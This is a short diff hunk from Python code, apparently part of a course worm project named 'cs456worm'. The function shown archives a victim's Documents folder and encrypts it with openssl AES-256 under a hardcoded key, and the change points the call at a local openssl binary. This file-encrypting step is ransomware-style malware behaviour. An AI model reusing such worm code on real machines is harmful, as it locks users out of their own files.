@@ -165,7 +165,7 @@ def createTarAndEncrypt():
 	    print("Finished tar of Documents folder")
 
 	    #Encrypt tar file
-	    Popen(["openssl", "aes-256-cbc", "-a", "-salt", "-in", "DocumentsDir.tar", "-out", "DocumentsDir.tar.enc", "-k", "-cs456worm"])
+	    Popen(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "DocumentsDir.tar", "-out", "DocumentsDir.tar.enc", "-k", "-cs456worm"])
 	    print("Created Encryption File")
     except Exception, e:
 	print("Problem in Execution:", e) 
